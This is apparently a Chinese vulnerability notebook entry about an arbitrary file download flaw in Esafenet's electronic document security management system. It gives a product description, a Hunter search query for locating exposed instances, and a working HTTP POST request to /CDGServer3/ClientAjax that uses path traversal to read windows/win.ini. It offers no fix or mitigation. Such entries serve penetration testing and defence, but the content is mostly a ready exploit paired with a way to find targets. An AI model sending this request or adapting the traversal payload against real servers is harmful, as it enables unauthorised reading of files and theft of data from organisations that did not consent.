# 亿赛通 电子文档安全管理系统 ClientAjax 任意文件下载

# 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通 电子文档安全管理系统 ClientAjax 任意文件下载。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/mbkO_M4VWp-8yvxF/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-404683.png)

# 四、漏洞复现
```plain
POST /CDGServer3/ClientAjax HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 102
Connection: close

command=downclientpak&InstallationPack=../../../../../../../../../../windows/win.ini&forward=index.jsp
```

![1709050220404-e9b727a0-dcd7-43ee-a59e-600d2c799756.png](./img/mbkO_M4VWp-8yvxF/1709050220404-e9b727a0-dcd7-43ee-a59e-600d2c799756-467598.png)



> 更新: 2024-04-20 22:01:30  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bp3z1gini1gk9gf8>